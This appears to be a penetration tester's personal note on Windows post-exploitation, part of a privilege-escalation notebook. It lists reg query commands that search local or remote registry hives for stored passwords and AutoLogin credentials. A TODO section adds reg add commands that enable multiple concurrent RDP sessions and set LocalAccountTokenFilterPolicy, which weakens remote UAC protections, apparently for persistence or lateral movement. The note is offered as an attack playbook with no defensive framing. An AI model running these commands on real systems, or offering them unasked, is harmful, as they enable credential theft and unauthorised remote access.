# Windows AutoLogin

## 01 - Manual

```
C:\> reg query [\\<IP>] HKLM /f password /t REG_SZ /s

C:\> reg query [\\<IP>] HKCU /f password /t REG_SZ /s

C:\> reg query [\\<IP>] "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

C:\> reg query [\\<IP>] "HKLM\Software\Microsoft\Windows NT\Currentversion\Winlogon" /v DefaultUserName

C:\> reg query [\\<IP>] "HKLM\Software\Microsoft\Windows NT\Currentversion\Winlogon" /v LastUsedUsername
```

---
## References

- [[Tactics && Techniques && Procedures (TTPs) Phases/F - Post Exploitation/Shell Is The Beginning/04 - Privilege Escalation/Windows/Local Privilege Escalation/Credentials/Stored Credentials/AutoLogin/Registry|AutoLogin Registry]]

- [Russian Government Cyber Activity Targeting Energy and Other Critical Infrastructure Sectors](https://datasecurity.ucsf.edu/news/russian-government-cyber-activity-targeting-energy-and-other-critical-infrastructure-sectors)

TODO: This is for persistence or idk what kind of mechanism persistence technique that it does so I'll have to put it somewhere else later

`C:\> reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v EnableConcurrentSessions /t REG_DWORD /d 1 /f`

`C:\> reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AllowMultipleTSSessions /t REG_DWORD /d 1 /f`

`C:\> reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v MaxInstanceCount /t REG_DWORD /d 100 /f`

`C:\> reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f`